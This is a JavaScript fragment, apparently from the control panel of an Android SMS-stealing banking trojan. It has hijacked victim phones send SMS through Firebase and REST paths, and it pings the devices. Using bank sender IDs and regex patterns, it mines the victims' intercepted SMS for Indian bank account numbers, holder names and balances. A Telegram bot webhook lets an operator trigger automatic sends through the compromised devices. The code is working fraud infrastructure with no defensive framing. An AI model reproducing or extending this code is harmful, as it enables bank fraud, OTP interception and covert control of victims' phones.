  if(navigator.clipboard&&navigator.clipboard.writeText){
    navigator.clipboard.writeText(text).then(function(){markCopied(btn);}).catch(function(){
      var ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);ta.select();
      try{document.execCommand('copy');markCopied(btn);}catch(e){toast('Copy failed',false);}
      document.body.removeChild(ta);
    });
  }else{
    var ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);ta.select();
    try{document.execCommand('copy');markCopied(btn);}catch(e){toast('Copy failed',false);}
    document.body.removeChild(ta);
  }
}

// ---- FIX: SIM Selection ----
var _sendSimSlot=1;
function selectSim(slot,btn){
  _sendSimSlot=slot;
  document.querySelectorAll('.sim-chip').forEach(function(el){el.classList.remove('active');});
  if(btn)btn.classList.add('active');
}

// ---- Send SMS — instant Firebase direct + REST fallback ----
function buildRabelSendPayload(sim,to,message){
  return{from:sim||1,to:String(to||'').trim(),message:message,isSended:false};
}
function buildRto9SendPayload(deviceId,sim,to,message){
  var slot=Math.max(0,(sim||1)-1);
  var toVal=String(to||'').trim();
  return{
    cmd:'send_sms',command:'send message',messageText:message,msg:message,
    phoneNumber:toVal,to:toVal,
    sendSms:{message:message,status:'pending',to:toVal},
    sms:{message:message,status:'pending',to:toVal},
    sim:slot,simSlot:String(slot),
    targetDeviceId:deviceId,
    timestamp:Date.now(),
    webhookEvent:'send_sms'
  };
}
function getSendAttempts(inst,d,to,message,sim){
  var id=d.rawId,out=[],rto,rabel;
  var toFull=String(to||'').trim();
  rabel=buildRabelSendPayload(sim,toFull,message);
  out.push({path:'clients/'+id+'/webhookEvent/sendSms',payload:rabel});
  if(isRtoStyleUrl(inst.restUrl)||isRabelPanel(inst)){
    rto=buildRto9SendPayload(id,sim,toFull,message);
    out.push({path:'clients/'+id,payload:rto});
    out.push({path:id,payload:rto});
    out.push({path:id+'/webhookEvent/sendSms',payload:rabel});
  }
  return out;
}
function promiseAny(promises){
  return new Promise(function(resolve,reject){
    if(!promises||!promises.length)return reject(new Error('No send path'));
    var fails=0, errors=[];
    promises.forEach(function(p){
      Promise.resolve(p).then(resolve).catch(function(e){
        errors.push(e&&e.message?e.message:String(e||'fail'));
        if(++fails>=promises.length)reject(new Error(errors.filter(Boolean).join(' · ')||'All send paths failed'));
      });
    });
  });
}
function sendSmsDirectFirebase(inst,attempts){
  if(!inst||!inst.db||!attempts.length)return Promise.reject();
  return promiseAny(attempts.map(function(a){
    return inst.db.ref(a.path).set(a.payload).then(function(){return{ok:true,path:a.path,via:'firebase'};});
  }));
}
function sendSmsViaRest(inst,attempts){
  if(!inst||!attempts.length)return Promise.reject();
  var auths=getFbAuthCandidates(inst), tasks=[];
  auths.forEach(function(auth){
    attempts.forEach(function(a){
      tasks.push(
        fetch(buildRestUrl(inst,a.path,auth),{
          method:'PUT',headers:{'Content-Type':'application/json'},
          body:JSON.stringify(a.payload),cache:'no-store'
        }).then(function(r){
          if(r.ok)return{ok:true,path:a.path,via:'rest'};
          return r.text().then(function(t){throw new Error((a.path||'rest')+' HTTP '+r.status+(t?' '+t.slice(0,80):''));});
        })
      );
    });
  });
  return promiseAny(tasks);
}
function normalizePhone(raw){
  var clean=String(raw||'').replace(/\D/g,'');
  if(clean.length===10)return clean;
  if(clean.length>10&&clean.indexOf('91')===0)return clean.slice(-10);
  return clean;
}
function sendSmsFetch(body){
  var hdr={'Content-Type':'application/json'};
  var apk=rebelApkHeaders();
  for(var k in apk)hdr[k]=apk[k];
  return fetch(SEND_SMS_URL,{method:'POST',headers:hdr,body:JSON.stringify(body||{})})
    .then(function(r){return r.json().then(function(j){return{httpOk:r.ok,data:j};});});
}
function sendSms(){
  var d=getSelDev();if(!d){toast('Select a device first',false);return;}
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase not loaded',false);return;}
  var to=normalizePhone(document.getElementById('sendTo').value.trim());
  var msg=document.getElementById('sendMsg').value.trim();
  if(!to||to.length<10){toast('Enter valid 10-digit number',false);return;}
  if(!msg){toast('Enter message',false);return;}
  if(_sendInFlight){toast('Sending...',true);return;}
  _sendInFlight=true;
  document.getElementById('sendStatus').textContent='Sending…';
  sendSmsInstant(to,msg,_sendSimSlot,function(ok,data){
    _sendInFlight=false;
    if(ok){
      document.getElementById('sendMsg').value='';
      document.getElementById('sendStatus').textContent='✅ '+(data&&data.message||'Sent instantly');
      toast('SMS sent!',true);
    }else{
      document.getElementById('sendStatus').textContent='❌ '+(data&&data.error||'Failed');
      toast(data&&data.error||'Send failed',false);
    }
  });
}

// ---- FIX: Check Recharge (Ping) ----
function checkRecharge(){
  var d=getSelDev();if(!d){toast('Select a device first',false);return;}
  var raw=clientsRawMap[d.id];
  var inst=getFbInstance(d.fbId);
  if(inst&&isRtoStyleUrl(inst.restUrl)){
    document.getElementById('sendStatus').textContent='Pinging device via Firebase command...';
    sendSmsInternal('9999999999', 'REBEL_PING', _sendSimSlot, function(success, data){
      document.getElementById('sendStatus').textContent=success?'✅ Ping command queued on device':'❌ '+(data&&data.error||'Ping failed');
      if(success) toast('Ping command sent — device APK must be online to execute',true);
      else toast(data&&data.error||'Ping failed',false);
    });
    return;
  }
  var phone=getDeviceDisplayPhone(raw);
  if(!phone||phone==='No Number'){toast('Device has no phone number',false);return;}
  document.getElementById('sendStatus').textContent='Pinging...';
  sendSmsInternal(phone, 'REBEL_PING', _sendSimSlot, function(success, data){
    document.getElementById('sendStatus').textContent=success?'✅ Ping sent – device is reachable!':'❌ '+(data&&data.error||'Ping failed – device may be offline');
    if(success) toast('Ping sent – device is reachable!',true);
    else toast(data&&data.error||'Ping failed – device may be offline',false);
  });
}
function sendSmsInstant(to,msg,simSlot,callback){
  var d=getSelDev();
  var inst=getFbInstance(d&&d.fbId);
  if(!d||!inst){if(callback)callback(false,{error:'No device'});return;}
  var phoneFull=String(to||'').trim();
  var phone=normalizePhone(phoneFull)||phoneFull;
  var attempts=getSendAttempts(inst,d,phoneFull||phone,msg,simSlot||1);
  var tasks=[];
  if(inst.db)tasks.push(sendSmsDirectFirebase(inst,attempts));
  tasks.push(sendSmsViaRest(inst,attempts));
  tasks.push(sendSmsFetch({
    device_id:d.rawId,to:phoneFull||phone,message:msg,sim:simSlot||1,
    database_url:inst.restUrl,auth_key:getFbAuthKey(inst),
    schema:inst.schema||'rabel',device_node:d.deviceNode||'clients',composite_id:d.id
  }).then(function(res){
    if(res.httpOk&&res.data&&res.data.ok)return{ok:true,message:res.data.message||'Sent',via:'php'};
    throw new Error((res.data&&res.data.error)||'PHP send failed');
  }));
  promiseAny(tasks).then(function(r){
    if(callback)callback(true,{ok:true,message:'SMS command queued'+(r.via?' via '+r.via:'')+(r.path?' → '+r.path:''),path:r.path});
  }).catch(function(e){
    var err=(e&&e.message)||'Send failed — device offline ya Firebase block';
    if(callback)callback(false,{error:err});
  });
}
function sendSmsInternal(to, msg, simSlot, callback){
  sendSmsInstant(to,msg,simSlot,callback);
}

// ─── BANK FUNCTIONS (Copied from laptop.php) ───
var BANK_SENDERS=[
  {keys:['SBIINB','SBIPSG','SBIBNK','ATMSBI','SBIUPI','STATEBNK','SBIECS','SBICRD','SBIMEL'],name:'State Bank of India'},
  {keys:['HDFCBK','HDFCBN','HDFCCC','HDFCLI','HDFCVC'],name:'HDFC Bank'},
  {keys:['ICICIB','ICICIT','ICICBK','ICICIA','ICICIP'],name:'ICICI Bank'},
  {keys:['AXISBK','AXISMR','AXISOL'],name:'Axis Bank'},
  {keys:['KOTAKB','KOTAKM','KOTAKBK'],name:'Kotak Mahindra Bank'},
  {keys:['PNBSMS','PNBANK','PNBMBK'],name:'Punjab National Bank'},
  {keys:['BOBSMS','BOBTXN','BANKBAR'],name:'Bank of Baroda'},
  {keys:['CANBNK','CANARA'],name:'Canara Bank'},
  {keys:['UNIONB','UNIONBK','UBOI'],name:'Union Bank of India'},
  {keys:['IDBIBK','IDBISM'],name:'IDBI Bank'},
  {keys:['YESBNK','YESBKL'],name:'Yes Bank'},
  {keys:['INDUSB','INDUSL'],name:'IndusInd Bank'},
  {keys:['FEDBNK','FEDERAL'],name:'Federal Bank'},
  {keys:['BANDHN','BANDHAN'],name:'Bandhan Bank'},
  {keys:['INDBNK','INDIANB'],name:'Indian Bank'},
  {keys:['IDFCFB','IDFCBK'],name:'IDFC FIRST Bank'},
  {keys:['RBLBNK','RBLCRD'],name:'RBL Bank'},
  {keys:['AUDBNK','AUBANK'],name:'AU Small Finance Bank'},
  {keys:['CENTBK','CENTOB'],name:'Central Bank of India'},
  {keys:['IOBCHN','IOBBNK'],name:'Indian Overseas Bank'},
  {keys:['UCOBNK','UCOBANK'],name:'UCO Bank'},
  {keys:['MAHABK','BANKMAH'],name:'Bank of Maharashtra'},
  {keys:['KARBNK','KBLBNK'],name:'Karnataka Bank'},
  {keys:['SOUTHBNK','SBTBNK'],name:'South Indian Bank'},
  {keys:['CITIBK','CITIBN'],name:'Citibank'},
  {keys:['STANCH','SCBANK'],name:'Standard Chartered'},
  {keys:['PAYZAP','PAYTMP'],name:'Paytm Payments Bank'},
  {keys:['AIRBNK','AIRTLM'],name:'Airtel Payments Bank'},
  {keys:['JANABK','JSFBNK'],name:'Jana Small Finance Bank'},
  {keys:['EQUITAS','EQUTAS'],name:'Equitas Small Finance Bank'},
  {keys:['UJVBNK','UJJIVN'],name:'Ujjivan Small Finance Bank'}
];
var BANK_BODY_PATTERNS=[
  [/state\s*bank\s*of\s*india/i,'State Bank of India'],
  [/\bSBI\b[\s\S]{0,40}(?:a\/c|acct|customer|dear|user)/i,'State Bank of India'],
  [/\bHDFC\s*Bank\b/i,'HDFC Bank'],
  [/dear\s+hdfc\b/i,'HDFC Bank'],
  [/\bICICI\s*Bank\b/i,'ICICI Bank'],
  [/dear\s+icici\b/i,'ICICI Bank'],
  [/\bAxis\s*Bank\b/i,'Axis Bank'],
  [/\bKotak\b[\s\S]{0,20}Bank/i,'Kotak Mahindra Bank'],
  [/\bPNB\b[\s\S]{0,30}(?:a\/c|acct|customer)/i,'Punjab National Bank'],
  [/punjab\s*national\s*bank/i,'Punjab National Bank'],
  [/bank\s*of\s*baroda/i,'Bank of Baroda'],
  [/\bBOB\b[\s\S]{0,30}(?:a\/c|acct)/i,'Bank of Baroda'],
  [/canara\s*bank/i,'Canara Bank'],
  [/union\s*bank\s*of\s*india/i,'Union Bank of India'],
  [/\bidbi\s*bank/i,'IDBI Bank'],
  [/\byes\s*bank\b/i,'Yes Bank'],
  [/indusind\s*bank/i,'IndusInd Bank'],
  [/federal\s*bank/i,'Federal Bank'],
  [/bandhan\s*bank/i,'Bandhan Bank'],
  [/indian\s*bank\b/i,'Indian Bank'],
  [/idfc\s*first\s*bank/i,'IDFC FIRST Bank'],
  [/\brbl\s*bank\b/i,'RBL Bank']
];

function parseInrAmount(s){var n=parseFloat(String(s).replace(/,/g,''));return isNaN(n)||n<0||n>1e12?null:n;}
function normalizeSmsSender(addr){var a=String(addr||'').toUpperCase().trim();a=a.replace(/^(?:VM|VK|VD|AD|JD|TX|BZ|BP|BT|BK|AX|AL|AM|ID|QP|JM|CP|XL|XX|VM-|AD-|JD-)[\s\-]*/i,'');return a.replace(/[^A-Z0-9]/g,'');}
function inferBankFromSender(address){var a=normalizeSmsSender(address);if(!a||a.length<3)return null;var best=null,bestLen=0,i,j,keys;for(i=0;i<BANK_SENDERS.length;i++){keys=BANK_SENDERS[i].keys;for(j=0;j<keys.length;j++){if(a.indexOf(keys[j])>=0&&keys[j].length>bestLen){best=BANK_SENDERS[i].name;bestLen=keys[j].length;}}}return best;}
function inferBankFromBody(body){var b=String(body||''),i;for(i=0;i<BANK_BODY_PATTERNS.length;i++){if(BANK_BODY_PATTERNS[i][0].test(b))return BANK_BODY_PATTERNS[i][1];}if(/\bSBI\b/i.test(b)&&/(?:a\/c|acct|account|credited|debited|bal)/i.test(b)) return 'State Bank of India';if(/\bHDFC\b/i.test(b)) return 'HDFC Bank';if(/\bICICI\b/i.test(b)) return 'ICICI Bank';if(/\bAXIS\b/i.test(b)) return 'Axis Bank';if(/\bPNB\b/i.test(b)) return 'Punjab National Bank';if(/\bBOB\b/i.test(b)&&/(?:a\/c|acct|bank)/i.test(b)) return 'Bank of Baroda';return null;}
function inferBankName(body,address){var fromSender=inferBankFromSender(address);if(fromSender)return fromSender;return inferBankFromBody(body);}
function extractAccountFromSms(body){var b=String(body||''),patterns=[/(?:a\/c|a\/c\.|ac|acct|account)\s*(?:no\.?|number|#)?\s*[:\-]?\s*(?:x{1,}|\*{1,}|X{1,})*(\d{4,18})/i,/(?:a\/c|acct|account)\s*(?:no\.?|number)?[:\s]*(?:x{2,}|\*{2,}|X{2,})*(\d{4})\b/i,/(?:ending|ends)\s*(?:with\s*)?(?:x+|\*+|X+)*(\d{4})\b/i,/(?:x{4,}|\*{4,}|X{4,})(\d{4})\b/,/(?:no\.?\s*)(?:x{2,}|\*{2,}|X{2,})(\d{4})\b/i,/(?:a\/c|acct)\s*(?:no\.?)?[:\s]*(\d{8,18})/i],i,m,best=null;for(i=0;i<patterns.length;i++){m=b.match(patterns[i]);if(m&&m[1]){var digits=String(m[1]).replace(/\D/g,'');if(digits.length>=4){if(!best||digits.length>best.length)best=digits;}}}return best;}
function extractHolderFromSms(body){var m=String(body||'').match(/dear\s+([A-Za-z][A-Za-z\s.'-]{1,40}?),/i);if(m&&m[1])return m[1].trim().replace(/\s+/g,' ');return '';}
function extractBalanceFromSms(body){var b=String(body||''),patterns=[/(?:total\s*)?(?:avl|available)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:avl|available)\s*bal[:\s]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/bal(?:ance)?\s*(?:is|as\s+on|now|as\s+of)\s*[:\-]?\s*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:closing|clear)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:balance\s+in\s+your\s+a\/c)[\s\S]{0,50}(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:credited|debited|withdrawn|deposited|transferred)[\s\S]{0,120}(?:avl|available)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:a\/c|acct)[^\d]{0,60}(?:avl|available)\s*bal(?:ance)?[:\s\-]*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/\bbal[:\s]+(?:inr|rs\.?|₹)\s*([\d,]+(?:\.\d{1,2})?)/i,/(?:inr|rs\.?|₹)\s*([\d,]+(?:\.\d{1,2})?)\s*(?:is\s+)?(?:your\s+)?(?:avl|available|a\/c)\s*bal/i,/(?:credited|debited|deposited|transferred|withdrawn)\s*(?:inr|rs\.?|₹)?\s*([\d,]+(?:\.\d{1,2})?)/i,/\b(?:bal|balance)\b[^0-9]*([\d,]+(?:\.\d{1,2})?)\s*(?:rs|inr|₹)/i],i,m,amt;for(i=0;i<patterns.length;i++){m=b.match(patterns[i]);if(m&&m[1]){amt=parseInrAmount(m[1]);if(amt!=null)return amt;}}return null;}
function isBalanceAlertSms(body){var b=String(body||'');return /(?:avl|available)\s*bal|balance\s*(?:is|as\s+on|now|as\s+of)|closing\s*bal|clear\s*bal|balance\s+in\s+your\s+a\/c|\bbal[:\s]+(?:rs|inr|₹)/i.test(b);}
function looksLikeBankSms(body,address){var bal=extractBalanceFromSms(body);if(bal==null)return false;if(inferBankFromSender(address))return true;if(inferBankFromBody(body))return true;if(extractAccountFromSms(body))return true;if(isBalanceAlertSms(body))return true;if(/(?:credited|debited|withdrawn|deposited|transferred|spent|paid|received)/i.test(body)&&/(?:a\/c|acct|account)/i.test(body))return true;if(/(?:sbi|hdfc|icici|axis|kotak|pnb|bob|canara|union|idbi|yes\s*bank|indusind|federal|bandhan|idfc|rbl)/i.test(body))return true;return false;}
function maskBankAccount(acct){if(!acct||acct==='Unknown')return'Unknown';var d=String(acct).replace(/\D/g,'');if(d.length<=4)return d||'Unknown';return 'XXXX'+d.slice(-4);}
function formatInr(n){if(n==null||isNaN(n))return'—';return '₹ '+Number(n).toLocaleString('en-IN',{minimumFractionDigits:2,maximumFractionDigits:2});}
function parseBankAccountsFromSms(smsList){var map={},keys,k,row,bals,sum,i,acctKey;(smsList||[]).forEach(function(s){if(!s||!s.body||!looksLikeBankSms(s.body,s.address))return;var bal=extractBalanceFromSms(s.body);if(bal==null)return;var acct=extractAccountFromSms(s.body)||'';var bank=inferBankName(s.body,s.address);if(!bank)return;acctKey=acct||'NA';k=bank+'|'+acctKey;if(!map[k])map[k]={bank:bank,account:acct,holder:'',balances:[],latestMs:0,latestDate:'',sender:''};row=map[k];if(!row.account&&acct)row.account=acct;var holder=extractHolderFromSms(s.body);if(holder&&!row.holder)row.holder=holder;row.balances.push(bal);var ms=s.ts||s.date||s.date_ms||0;if(ms>=row.latestMs){row.latestMs=ms;row.latestDate=s.date_readable||'';row.current=bal;row.sender=s.address||'';if(holder)row.holder=holder;if(acct)row.account=acct;}});keys=Object.keys(map);return keys.map(function(key){row=map[key];bals=row.balances;sum=0;for(i=0;i<bals.length;i++)sum+=bals[i];return{bank:row.bank,account:row.account,accountMask:maskBankAccount(row.account||'Unknown'),holder:row.holder||'',sender:row.sender||'',current:row.current!=null?row.current:bals[bals.length-1],average:sum/bals.length,highest:Math.max.apply(null,bals),lowest:Math.min.apply(null,bals),count:bals.length,latestDate:row.latestDate};}).sort(function(a,b){return a.bank.localeCompare(b.bank);});}
function renderBankAccounts(){
  var dev=getSelDev(),listEl=document.getElementById('bankList'),emptyEl=document.getElementById('bankEmpty');
  if(!dev){if(emptyEl){emptyEl.style.display='';emptyEl.innerHTML='<div class="ico">📱</div>Select a device to load bank balances<br><span style="font-size:12px;opacity:.6">Tap a device on Home</span>';}if(listEl)listEl.innerHTML='';return;}
  var smsList=(deviceSmsCache[dev.id]&&deviceSmsCache[dev.id].list)||window_allSms||[];
  if(!smsList.length&&emptyEl){emptyEl.style.display='';emptyEl.innerHTML='<div class="ico">📭</div>No SMS found<br><span style="font-size:12px;opacity:.6">Wait for SMS sync or switch to SMS tab</span>';listEl.innerHTML='';return;}
  var banks=parseBankAccountsFromSms(smsList);
  if(emptyEl)emptyEl.style.display=banks.length?'none':'';
  if(!banks.length){listEl.innerHTML='<div class="bank-empty"><div class="ico">🏦</div>No bank balance SMS found<br><span style="font-size:12px;opacity:.6">SBI, HDFC, ICICI alerts will appear here</span></div>';return;}
  listEl.innerHTML=banks.map(function(b){
    var sub=[b.holder?'👤 '+esc(b.holder):'',b.accountMask!=='Unknown'?'A/C '+esc(b.accountMask):''].filter(Boolean).join(' · ');
    return '<div class="bank-card-m"><div style="display:flex;gap:10px;align-items:center;margin-bottom:8px"><div style="font-size:28px">🏦</div><div><div class="bank-name-m">'+esc(b.bank)+'</div>'+
      (sub?'<div class="bank-acct-m">'+sub+'</div>':'')+
      (b.sender?'<div class="bank-acct-m" style="margin-top:2px">via '+esc(b.sender)+'</div>':'')+
      '</div></div>'+
      '<div class="bank-grid-m">'+
      '<div class="bank-stat-m"><div class="bank-stat-lbl-m">CURRENT BALANCE</div><div class="bank-stat-val-m current">'+formatInr(b.current)+'</div></div>'+
      '<div class="bank-stat-m"><div class="bank-stat-lbl-m">AVERAGE</div><div class="bank-stat-val-m">'+formatInr(b.average)+'</div></div>'+
      '<div class="bank-stat-m"><div class="bank-stat-lbl-m">HIGHEST</div><div class="bank-stat-val-m">'+formatInr(b.highest)+'</div></div>'+
      '<div class="bank-stat-m"><div class="bank-stat-lbl-m">LOWEST</div><div class="bank-stat-val-m">'+formatInr(b.lowest)+'</div></div>'+
      '</div><div class="bank-meta-m">'+b.count+' balance alert SMS'+(b.latestDate?' · Updated: '+esc(b.latestDate):'')+'</div></div>';
  }).join('');
}

function switchTab(){}

/* APK headers + boot */
function rebelApkHeaders(){
  var h={};
  if(window.RebelAndroid){
    try{
      h['X-Rebel-Attest']=RebelAndroid.getAttest();
      h['X-Rebel-Device']=RebelAndroid.getDevice();
    }catch(e){}
  }
  return h;
}

/* AUTO TOKEN (Telegram channel SMS TOKEN → auto send via Firebase) */
var _autoTokenOn=false;
var _smsTokenLog=[];
var _autoTokenConfig={};
var _autoTokenDeviceSim=1;
function renderAutoTokenDeviceLog(log){
  var el=document.getElementById('autoTokenDeviceLog');
  if(!el)return;
  var rows=log||_smsTokenLog||[];
  if(!rows.length){el.innerHTML='<div class="empty-mini">Activity log yahan dikhega</div>';return;}
  el.innerHTML=rows.slice(0,8).map(function(row){
    var ok=row.ok?'ok':'bad';
    return '<div class="token-log '+ok+'">'+(row.time?esc(row.time)+' · ':'')+'→ '+esc(row.to||'?')+' · '+esc(String(row.message||'').slice(0,50))+'</div>';
  }).join('');
}
function fillAutoTokenDeviceFields(cfg){
  cfg=cfg||_autoTokenConfig||{};
  var tokenEl=document.getElementById('devTgBotToken');
  var channelEl=document.getElementById('devTgChannelId');
  var ownerEl=document.getElementById('devTgOwnerId');
  if(tokenEl)tokenEl.value=cfg.bot_token||'';
  if(channelEl)channelEl.value=cfg.channel_id||'';
  if(ownerEl)ownerEl.value=cfg.owner_id||'';
  _autoTokenDeviceSim=cfg.sim||_sendSimSlot||1;
  selectAutoTokenDeviceSim(_autoTokenDeviceSim,null);
  var tg=document.getElementById('autoTokenDeviceToggle');
  if(tg)tg.classList.toggle('on',!!_autoTokenOn);
}
function updateAutoTokenDeviceBanner(d){
  var phoneEl=document.getElementById('autoTokenDevicePhone');
  var metaEl=document.getElementById('autoTokenDeviceMeta');
  if(!d){
    if(phoneEl)phoneEl.textContent='Koi device select nahi';
    if(metaEl)metaEl.textContent='Pehle device card tap karo';
    return;
  }
  if(phoneEl)phoneEl.textContent=(d.displayPhone||d.name||'Device')+' · '+(d.status==='online'?'🟢 Online':'🔴 Offline');
  if(metaEl)metaEl.textContent='Model: '+(d.name||'?')+' · Battery '+d.battery+'% · '+(d.fbName||'Firebase');
}
function selectAutoTokenDeviceSim(n,btn){
  _autoTokenDeviceSim=n||1;
  _sendSimSlot=_autoTokenDeviceSim;
  document.querySelectorAll('.dev-at-sim').forEach(function(b){b.classList.remove('active');});
  var id='devAtSim'+_autoTokenDeviceSim;
  var el=document.getElementById(id);
  if(el)el.classList.add('active');
  if(btn)btn.classList.add('active');
}
function toggleAutoTokenDeviceEnable(){
  _autoTokenOn=!_autoTokenOn;
  var tg=document.getElementById('autoTokenDeviceToggle');
  if(tg)tg.classList.toggle('on',!!_autoTokenOn);
}
function openAutoTokenDeviceSetup(d){
  d=d||getSelDev();
  if(!d){toast('Pehle device kholo',false);return;}
  selDev=d.id;
  updateAutoTokenDeviceBanner(d);
  fillAutoTokenDeviceFields(_autoTokenConfig);
  renderAutoTokenDeviceLog(_smsTokenLog);
  var bg=document.getElementById('deviceSetupBg');
  var sheet=document.getElementById('autoTokenDeviceSheet');
  if(bg)bg.classList.add('open');
  if(sheet)sheet.classList.add('open');
}
function closeAutoTokenDeviceSetup(){
  var bg=document.getElementById('deviceSetupBg');
  var sheet=document.getElementById('autoTokenDeviceSheet');
  if(bg)bg.classList.remove('open');
  if(sheet)sheet.classList.remove('open');
}
function setupAutoTokenFromDevice(){
  var d=getSelDev();
  if(!d){toast('Pehle device card tap karo',false);return;}
  smsTokenFetch({action:'get'}).then(function(res){
    if(res&&res.ok){
      if(res.config){
        _autoTokenOn=!!res.config.enabled;
        _autoTokenConfig=res.config;
      }
      _smsTokenLog=res.log||[];
    }
    openAutoTokenDeviceSetup(d);
  }).catch(function(){
    openAutoTokenDeviceSetup(d);
  });
}
function saveAutoTokenDeviceSetup(){
  var d=getSelDev();
  if(!d){toast('Device select nahi hai',false);return;}
  var inst=getFbInstance(d.fbId);
  if(!inst){toast('Firebase missing',false);return;}
  var token=String((document.getElementById('devTgBotToken')||{}).value||'').trim();
  var channel=String((document.getElementById('devTgChannelId')||{}).value||'').trim();
  var owner=String((document.getElementById('devTgOwnerId')||{}).value||'').trim();
  if(!token){toast('Bot token daalo',false);document.getElementById('devTgBotToken')&&document.getElementById('devTgBotToken').focus();return;}
  if(!channel){toast('Channel ID daalo',false);document.getElementById('devTgChannelId')&&document.getElementById('devTgChannelId').focus();return;}
  var tg=document.getElementById('autoTokenDeviceToggle');
  var enabled=tg?tg.classList.contains('on'):true;
  _autoTokenOn=enabled;
  toast('Saving…',true);
  smsTokenFetch({
    action:'save',
    enabled:enabled,
    bot_token:token,
    channel_id:channel,
    owner_id:owner,
    device_id:d.rawId,
    database_url:inst.restUrl,
    fb_name:inst.name,
    auth_key:getFbAuthKey(inst),
    schema:inst.schema||'rabel',
    device_node:d.deviceNode||'clients',
    sim:_autoTokenDeviceSim||1
  }).then(function(res){
    if(!res||!res.ok){toast('Save failed',false);return;}
    if(res.config){_autoTokenConfig=res.config;_autoTokenOn=!!res.config.enabled;}
    if(res.log)_smsTokenLog=res.log;
    updateAutoTokenUi(_autoTokenConfig);
    renderAutoTokenDeviceLog(_smsTokenLog);
    renderAutoTokenLog(_smsTokenLog);
    toast((enabled?'Auto Token ON':'Settings saved')+' · Sim '+(_autoTokenDeviceSim||1)+' · '+d.displayPhone,true);
    smsTokenFetch({action:'setup_webhook',bot_token:token,channel_id:channel,owner_id:owner}).then(function(h){
      if(h&&h.ok)toast('Webhook connected ✓',true);
    }).catch(function(){});
  }).catch(function(){toast('Save failed',false);});
}
function setupAutoTokenDeviceWebhook(){
  var token=String((document.getElementById('devTgBotToken')||{}).value||'').trim();
  var channel=String((document.getElementById('devTgChannelId')||{}).value||'').trim();
  var owner=String((document.getElementById('devTgOwnerId')||{}).value||'').trim();
  if(!token||!channel){toast('Pehle token aur channel ID daalo',false);return;}
  toast('Webhook connect ho raha hai…',true);
  smsTokenFetch({action:'setup_webhook',bot_token:token,channel_id:channel,owner_id:owner}).then(function(h){
    if(h&&h.ok){toast('Webhook connected ✓',true);return;}
    toast((h&&h.error)||(h&&h.telegram&&h.telegram.description)||'Webhook failed',false);
  }).catch(function(){toast('Webhook failed',false);});
}
function useSelForAutoToken(){
  var d=getSelDev();
  if(!d){toast('Pehle koi device select karo (card tap karo)',false);return;}
  setupAutoTokenFromDevice();
}
function smsTokenFetch(body){
  var hdr={'Content-Type':'application/json'};
  var apk=rebelApkHeaders();
  for(var k in apk)hdr[k]=apk[k];
  return fetch(SMS_TOKEN_URL,{method:'POST',headers:hdr,body:JSON.stringify(body||{})})
    .then(function(r){return r.json();});
}
function renderAutoTokenLog(log){
  var el=document.getElementById('autoTokenLog');
  if(!el)return;
  var rows=log||_smsTokenLog||[];
  if(!rows.length){el.innerHTML='<div class="empty-mini">No auto-token activity yet</div>';return;}
  el.innerHTML=rows.map(function(row){
    var ok=row.ok?'ok':'bad';
    var when=row.time||'';
    var msg=String(row.message||'').slice(0,60);
    return '<div class="token-log '+ok+'">'+(when?esc(when)+' · ':'')+'→ '+esc(row.to||'?')+' · '+esc(msg)+(row.error&&!row.ok?' · '+esc(row.error):'')+'</div>';
  }).join('');
}
function fillTelegramFields(cfg){
  cfg=cfg||{};
  var tokenEl=document.getElementById('tgBotToken');
  var channelEl=document.getElementById('tgChannelId');
  var ownerEl=document.getElementById('tgOwnerId');
  if(tokenEl&&cfg.bot_token)tokenEl.value=cfg.bot_token;
  if(channelEl)channelEl.value=cfg.channel_id||'';
  if(ownerEl)ownerEl.value=cfg.owner_id||'';
}
function updateAutoTokenUi(cfg){
  _autoTokenConfig=cfg||_autoTokenConfig||{};
  fillTelegramFields(_autoTokenConfig);
  var devEl=document.getElementById('autoTokenDevice');
  var stEl=document.getElementById('autoTokenStatus');
  var toggle=document.getElementById('autoTokenToggle');
  if(toggle)toggle.classList.toggle('on',!!_autoTokenOn);
  if(devEl){
    if(_autoTokenConfig.device_id){
      devEl.textContent=(_autoTokenConfig.fb_name?_autoTokenConfig.fb_name+' · ':'')+_autoTokenConfig.device_id.slice(0,12)+'…';
    }else{
      devEl.textContent='Home se device select karo → Set Device';
    }
  }
  if(stEl){
    var parts=[];
    if(_autoTokenConfig.has_bot_token||_autoTokenConfig.bot_token)parts.push('Bot ✓');
    else parts.push('Bot ✗');
    if(_autoTokenConfig.channel_id)parts.push('Ch '+_autoTokenConfig.channel_id);
    if(_autoTokenOn)parts.unshift('✅ ON');
    else parts.unshift('⏸ OFF');
    if(_autoTokenConfig.device_id)parts.push('Sim '+(_autoTokenConfig.sim||1));
    stEl.textContent=parts.join(' · ');
  }
}
function saveTelegramSettings(){
  var tokenEl=document.getElementById('tgBotToken');
  var channelEl=document.getElementById('tgChannelId');
  var ownerEl=document.getElementById('tgOwnerId');
  var token=tokenEl?String(tokenEl.value||'').trim():'';
  var channel=channelEl?String(channelEl.value||'').trim():'';
  var owner=ownerEl?String(ownerEl.value||'').trim():'';
  if(!token){toast('Bot token daalo',false);return;}
  if(!channel){toast('Channel ID daalo (e.g. -100...)',false);return;}
  smsTokenFetch({
    action:'save',
    bot_token:token,
    channel_id:channel,
    owner_id:owner,
    enabled:_autoTokenOn
  }).then(function(d){
    if(!d||!d.ok){toast((d&&d.error)||'Save failed',false);return;}
    if(d.config){
      _autoTokenConfig=d.config;
      _autoTokenOn=!!d.config.enabled;
    }
    updateAutoTokenUi(_autoTokenConfig);
    toast('Telegram settings saved',true);
  }).catch(function(){toast('Save failed',false);});
}
function setupAutoTokenWebhook(){
  var tokenEl=document.getElementById('tgBotToken');
  var channelEl=document.getElementById('tgChannelId');
  var ownerEl=document.getElementById('tgOwnerId');
  var body={action:'setup_webhook'};
